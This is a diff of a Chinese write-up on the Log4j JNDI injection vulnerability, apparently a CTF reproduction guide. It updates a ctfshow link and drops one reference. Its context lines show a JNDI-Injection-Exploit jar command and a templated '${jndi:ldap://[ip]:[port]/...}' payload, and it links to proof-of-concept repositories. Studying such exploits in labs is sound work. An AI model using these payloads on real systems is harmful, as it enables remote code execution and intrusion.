@@ -239,7 +239,7 @@ var3实例化，接着var3lookup，加载
 
 ## 0x03 题目
 
-在12月10日晚间 [ctfshow](https://ctf.show/challenges)也上线了该漏洞的复现，利用思路如上，直接拿编译好的jar文件打
+在12月10日晚间 [ctfshow](https://ctf.show/challenges#Log4j%E5%A4%8D%E7%8E%B0-1730)也上线了该漏洞的复现，利用思路如上，直接拿编译好的jar文件打
 
 ```sh
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A [ip] -C "[payload]"
@@ -290,8 +290,6 @@ ${jndi:ldap://[ip]:[port]/[xxxx]}
 https://github.com/tangxiaofeng7/apache-log4j-poc
 
 https://github.com/udoless/apache-log4j-rce-poc
-
-https://github.com/welk1n/JNDI-Injection-Exploit
 
 
 
